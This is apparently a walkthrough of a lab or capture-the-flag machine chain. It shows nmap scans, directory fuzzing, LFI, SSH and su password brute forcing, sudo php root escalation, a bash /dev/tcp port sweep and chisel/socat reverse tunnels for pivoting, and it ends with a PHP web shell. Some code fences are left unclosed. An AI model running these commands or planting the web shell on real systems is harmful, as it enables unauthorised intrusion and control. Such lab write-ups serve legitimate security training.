- I start scaning the open ports
    
    ```bash
    nmap -p- -vvv -sS --min-rate 5000 -Pn 10.10.10.2 -oG scan
    ```

- Scanning open ports
    
    ```bash
    nmap -p22,80 -sCV 10.10.10.2 -oN ports

    ![image 3](https://github.com/user-attachments/assets/b009561c-4997-46aa-b0c2-17fe5f47c86a)

    

- We check the technologies being used by the web application
    
    ```bash
    whatweb 10.10.10.2
    ```
    
    ![image 4](https://github.com/user-attachments/assets/7362722a-a7fd-4e07-96ea-feb25c851cdd)

    

- We perform fuzzing to try to find directories
    
    ```bash
    gobuster dir -u http://10.10.10.2/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
    ```
    
    ![image 5](https://github.com/user-attachments/assets/36b52e26-f5c6-4b9b-b4d9-fbffdc4caf4f)

- It seems that the web page has a parameter with which I can try to load a local file (`LFI`)
    
    ![image 7](https://github.com/user-attachments/assets/8ef7b4c8-659b-47c1-a721-ed1dd5178487)

    

- With the absolute path it does not load anything. When trying with relative paths I managed to load files

- I discovered two users, `seller` and `manchi`. I make a brute force attack to try to connect via ssh with one of these users
- With the user `seller` I could not get his password but I could with `manchi`
    
    ```bash
    hydra -l manchi -P /usr/share/wordlist/rockyou.txt ssh://10.10.10.2
    ```

- I try to connected via ssh and after searching for a while for ways to escalate our privileges but I don´t found nothing. I tried to brute force with the user `seller`
    [Sudo_BruteForce](https://github.com/Maalfer/Sudo_BruteForce)
    
    ```bash
    ./Linux-Su-Force.sh seller rockyou.txt

    ![image 10](https://github.com/user-attachments/assets/31421030-7368-475e-ada8-846fb73aeb85)

    

- I connect as seller and list the commands that I can execute as sudo without providing a password
    
    ```bash
    sudo -l
    ```
    
    ![image 11](https://github.com/user-attachments/assets/ad8bd9d9-3ca3-4560-8018-7146e3b93ef6)

    

- I search in gtfobins for ways to escalate privileges with sudo php and become root
    
    [GTFOBins](https://gtfobins.github.io/)
    
    ```bash

    sudo php -r "system('$CMD');"

- I find out which ips this computer has 'hostname -I'. I apply a reconnaissance to see what other hosts are on network 20.20.20.0/24
    
    ```bash
    #!/bin/bash
    
    for i in $(seq 1 254); do
    	for port in 21 22 80 443 445 8080; do
    		timeout 1 bash -c "echo '' > /dev/tcp/20.20.20.$i/$port" &>/dev/null && echo "[+] Host 20.20.20.$i - PORT $port - OPEN" &
    	done
    done; wait
    
    ```

- I create a tunnel between the two machines using `chisel`
    
    ```bash
    #Execute this from your machine
    ./chisel server --reverse -p 1234
    
    #Execute this from the 10.10.10.2 machine
    ./chisel client 10.10.10.1:1234 R:1080:socks
    ```

    - Add in `/etc/proxychains4.conf` the following line
        
        ```bash
        socks5 127.0.0.1 1080
        ```
        

- As we see that you have a web service on port 80, we perform an enumeration and find a secret.php file.
    
    ```bash
    gobuster dir -u http://20.20.20.3/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --proxy socks5://127.0.0.1:1080 -t 5 -x .php,.txt

- I create a tunnel between the three machines using `chisel` and `socat`
    
    ```bash
    ./chisel client 20.20.20.2:4237 R:8888:socks
    
    ./socat TCP-LISTEN:4237,fork TCP:10.10.10.1:1234

- I scanned the 5000 most common ports and found port 80 open.
    
    ```bash
    nmap -sT -Pn --top-ports 5000 -open- --min-rate 5000 -vvv -n 30.30.30.3 2>/dev/null

```bash
<?php 
	system($_GET['cmd']);
?>
```

- I perform fuzzing to find directories
